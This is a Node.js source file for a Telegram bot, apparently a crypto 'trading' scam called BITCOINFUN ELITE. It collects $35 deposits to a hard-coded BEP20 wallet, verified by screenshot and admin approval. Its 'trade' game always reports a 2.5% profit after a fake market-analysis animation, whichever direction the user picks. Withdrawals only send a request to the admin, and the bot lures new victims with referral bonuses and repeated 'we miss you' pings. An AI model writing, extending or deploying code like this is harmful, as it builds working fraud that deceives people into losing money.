require('dotenv').config();
const { Telegraf, Markup, session } = require('telegraf');
const express = require('express');
const cron = require('node-cron');

const app = express();
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const ADMIN_ID = process.env.ADMIN_ID; 
const BEP20_ADDRESS = "0x2784B4515D98C2a3Dbf59ebAAd741E708B6024ba";

const db = { users: {} };
bot.use(session());

// --- WELCOME ---
bot.start((ctx) => {
    const userId = ctx.from.id.toString();
    const refId = ctx.startPayload;

    if (!db.users[userId]) {
        db.users[userId] = { 
            balance: 0, deposited: 0, lastPlayed: 0, referrals: 0,
            username: ctx.from.username || ctx.from.first_name 
        };
        if (refId && refId !== userId && db.users[refId]) {
            db.users[refId].referrals++;
            db.users[refId].balance += 10;
            bot.telegram.sendMessage(refId, `🎊 New Referral! You earned $10!`);
        }
        bot.telegram.sendMessage(ADMIN_ID, `🆕 New User: @${db.users[userId].username}`);
    }

    ctx.replyWithHTML(
        `💎 <b>BITCOINFUN ELITE</b> 💎\n\n` +
        `💰 Balance: <b>$${db.users[userId].balance.toFixed(2)}</b>\n` +
        `👥 Referrals: <b>${db.users[userId].referrals}</b>\n\n` +
        `👇 <b>Choose an option:</b>`,
        Markup.inlineKeyboard([
            [Markup.button.callback('💳 DEPOSIT $35', 'deposit')],
            [Markup.button.callback('📈 TRADE (UP/DOWN)', 'game')],
            [Markup.button.callback('💸 WITHDRAW', 'withdraw')],
            [Markup.button.callback('🤝 INVITE & EARN $10', 'refer')]
        ])
    );
});

// --- DEPOSIT & ADMIN APPROVAL ---
bot.action('deposit', (ctx) => {
    ctx.replyWithHTML(`🚀 <b>DEPOSIT $35 BEP20</b>\n\nAddress:\n<code>${BEP20_ADDRESS}</code>\n\nSend $35+, then click below:`,
    Markup.inlineKeyboard([[Markup.button.callback('📸 Send Screenshot', 'send_ss')]]));
});

bot.action('send_ss', (ctx) => {
    db.users[ctx.from.id].waitingForSS = true;
    ctx.reply("Please upload your payment screenshot now.");
});

bot.on('photo', async (ctx) => {
    const userId = ctx.from.id;
    if (db.users[userId]?.waitingForSS) {
        db.users[userId].waitingForSS = false;
        const photoId = ctx.message.photo[ctx.message.photo.length - 1].file_id;
        ctx.reply("✅ Sent to Admin for verification...");
        bot.telegram.sendPhoto(ADMIN_ID, photoId, {
            caption: `💰 <b>DEPOSIT</b>\nUser: @${ctx.from.username}\nID: ${userId}`,
            ...Markup.inlineKeyboard([[Markup.button.callback('✅ Approve $35', `approve_${userId}_35`)]])
        });
    }
});

bot.action(/approve_(\d+)_(\d+)/, (ctx) => {
    const [_, userId, amount] = ctx.match;
    db.users[userId].balance += parseInt(amount);
    db.users[userId].deposited += parseInt(amount);
    bot.telegram.sendMessage(userId, `🥳 <b>Congratulations!</b>\nDeposit approved! Balance: $${db.users[userId].balance}`);
    ctx.editMessageCaption(`✅ Approved $${amount}`);
});

// --- TRADING WITH 30 SEC DELAY ---
bot.action('game', (ctx) => {
    const user = db.users[ctx.from.id];
    const cooldown = 12 * 60 * 60 * 1000;
    if (Date.now() - user.lastPlayed < cooldown) return ctx.answerCbQuery("⏳ Wait 12 hours!", { show_alert: true });

    ctx.reply("📉 <b>BTC Direction:</b>", Markup.inlineKeyboard([
        [Markup.button.callback('🟢 UP', 'start_trade'), Markup.button.callback('🔴 DOWN', 'start_trade')]
    ], { parse_mode: 'HTML' }));
});

bot.action('start_trade', async (ctx) => {
    const user = db.users[ctx.from.id];
    user.lastPlayed = Date.now();
    
    // 30 Second "Sexy" Loading Animation
    await ctx.editMessageText("⏳ <b>Analyzing Market Trends...</b>", { parse_mode: 'HTML' });
    
    setTimeout(() => ctx.editMessageText("📊 <b>Checking Liquidity Pool...</b>", { parse_mode: 'HTML' }), 10000);
    setTimeout(() => ctx.editMessageText("🚀 <b>Finalizing Trade Results...</b>", { parse_mode: 'HTML' }), 20000);

    setTimeout(() => {
        const profit = user.balance * 0.025;
        user.balance += profit;
        ctx.editMessageText(`🎉 <b>TRADE SUCCESS!</b>\n\nProfit: <b>+$${profit.toFixed(2)}</b>\nBalance: <b>$${user.balance.toFixed(2)}</b>`, { parse_mode: 'HTML' });
    }, 30000);
});

// --- WITHDRAWAL CONTROL ---
bot.action('withdraw', (ctx) => {
    ctx.reply(`💸 Min: $30 | Limit: $${db.users[ctx.from.id].deposited}\n\nEnter amount:`);
    db.users[ctx.from.id].waitingForWD = true;
});

bot.on('text', (ctx) => {
    const user = db.users[ctx.from.id];
    if (user?.waitingForWD) {
        const amt = parseFloat(ctx.message.text);
        if (amt > user.deposited || amt < 30) return ctx.reply("❌ Invalid Amount or Limit Exceeded!");
        user.waitingForWD = false;
        bot.telegram.sendMessage(ADMIN_ID, `💸 <b>WD REQ</b>\nUser: @${ctx.from.username}\nAmt: $${amt}`);
        ctx.reply("✅ Request sent to Admin.");
    }
});

// --- ADMIN STATS ---
bot.command('admin', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return;
    const totalUsers = Object.keys(db.users).length;
    const totalBal = Object.values(db.users).reduce((s, u) => s + u.balance, 0);
    ctx.reply(`📊 <b>Stats</b>\nUsers: ${totalUsers}\nTotal Bal: $${totalBal.toFixed(2)}`, { parse_mode: 'HTML' });
});

// --- PING SYSTEM ---
cron.schedule('0 */8 * * *', () => {
    Object.keys(db.users).forEach(uid => bot.telegram.sendMessage(uid, "👋 <b>We miss you!</b>\nTime to trade and grow! 📈", { parse_mode: 'HTML' }));
});

app.get('/', (req, res) => res.send('Live'));
app.listen(process.env.PORT || 3000, "0.0.0.0");
bot.launch();
